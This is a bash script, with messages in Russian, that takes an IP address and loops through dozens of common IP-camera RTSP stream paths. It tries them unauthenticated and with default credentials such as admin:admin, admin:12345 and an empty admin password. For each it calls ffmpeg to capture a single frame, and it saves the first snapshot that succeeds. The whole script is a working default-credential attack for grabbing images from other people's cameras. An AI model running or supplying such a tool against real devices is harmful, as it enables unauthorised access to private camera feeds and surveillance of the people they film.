#!/bin/bash

if [ -z "$1" ]; then
  echo "Использование: $0 <IP-адрес>"
  exit 1
fi

IP="$1"
TIMESTAMP=$(date +%s)
OUTFILE="snapshot_${IP//./_}_$TIMESTAMP.jpg"

PATHS=(
  "rtsp://$IP:554/live.sdp"
  "rtsp://$IP:554/live0.sdp"
  "rtsp://$IP:554/h264"
  "rtsp://$IP:554/h264Preview_01_main"
  "rtsp://$IP:554/h264Preview_01_sub"
  "rtsp://$IP:554/stream1"
  "rtsp://$IP:554/stream0"
  "rtsp://$IP:554/0"
  "rtsp://$IP:554/1"
  "rtsp://$IP:554/2"
  "rtsp://$IP:554/videoMain"
  "rtsp://$IP:554/videoSub"
  "rtsp://$IP:554/ch0_0.264"
  "rtsp://$IP:554/mpeg4"
  "rtsp://$IP:554/ipcam.sdp"
  "rtsp://$IP:554/profile1"
  "rtsp://$IP:554/profile2"
  "rtsp://$IP:554/media/video1"
  "rtsp://$IP:554/media/video2"
  "rtsp://$IP:554/user=admin&password=&channel=1&stream=0.sdp"
  "rtsp://$IP:554/cam/realmonitor?channel=1&subtype=0"
  "rtsp://$IP:554/cam/realmonitor?channel=1&subtype=1"
  "rtsp://$IP:554/onvif1"
  "rtsp://$IP:554/onvif/channel1"
  "rtsp://$IP:554/axis-media/media.amp"

  "rtsp://admin:admin@$IP:554/live.sdp"
  "rtsp://admin:admin@$IP:554/live0.sdp"
  "rtsp://admin:admin@$IP:554/h264"
  "rtsp://admin:admin@$IP:554/h264Preview_01_main"
  "rtsp://admin:admin@$IP:554/h264Preview_01_sub"
  "rtsp://admin:admin@$IP:554/0"
  "rtsp://admin:admin@$IP:554/1"
  "rtsp://admin:admin@$IP:554/2"
  "rtsp://admin:admin@$IP:554/stream1"
  "rtsp://admin:admin@$IP:554/videoMain"
  "rtsp://admin:admin@$IP:554/videoSub"
  "rtsp://admin:admin@$IP:554/ch0_0.264"
  "rtsp://admin:admin@$IP:554/mpeg4"
  "rtsp://admin:admin@$IP:554/profile1"
  "rtsp://admin:admin@$IP:554/profile2"
  "rtsp://admin:admin@$IP:554/ipcam.sdp"
  "rtsp://admin:admin@$IP:554/media/video1"
  "rtsp://admin:admin@$IP:554/media/video2"
  "rtsp://admin:admin@$IP:554/Streaming/Channels/101"
  "rtsp://admin:admin@$IP:554/Streaming/Channels/102"
  "rtsp://admin:admin@$IP:554/stream=0"
  "rtsp://admin:admin@$IP:554/stream=1"
  "rtsp://admin:admin@$IP:554/live/ch0"
  "rtsp://admin:admin@$IP:554/cam/realmonitor?channel=1&subtype=0"
  "rtsp://admin:admin@$IP:554/cam/realmonitor?channel=1&subtype=1"

  "rtsp://admin:12345@$IP:554/live.sdp"
  "rtsp://admin:12345@$IP:554/0"
  "rtsp://admin:12345@$IP:554/1"
  "rtsp://admin:12345@$IP:554/stream1"
  "rtsp://admin:12345@$IP:554/videoMain"
  "rtsp://admin:12345@$IP:554/cam/realmonitor?channel=1&subtype=0"
  "rtsp://admin:12345@$IP:554/cam/realmonitor?channel=1&subtype=1"
  "rtsp://admin:12345@$IP:554/Streaming/Channels/101"
  "rtsp://admin:12345@$IP:554/Streaming/Channels/102"

  "rtsp://admin:@$IP:554/live.sdp"
  "rtsp://admin:@$IP:554/0"
  "rtsp://admin:@$IP:554/stream1"
)


for RTSP_URL in "${PATHS[@]}"; do
  echo "[*] Пробую $RTSP_URL ..."
  ffmpeg -rtsp_transport tcp -y -i "$RTSP_URL" -vframes 1 -q:v 2 "$OUTFILE" -loglevel error
  if [ -s "$OUTFILE" ]; then
    echo "[+] Успех! Сохранено в: $OUTFILE"
    echo "[+] Получено с потока: $RTSP_URL"
    exit 0
  else
    rm -f "$OUTFILE"
  fi
done

echo "[-] Не удалось получить изображение с $IP"
exit 1
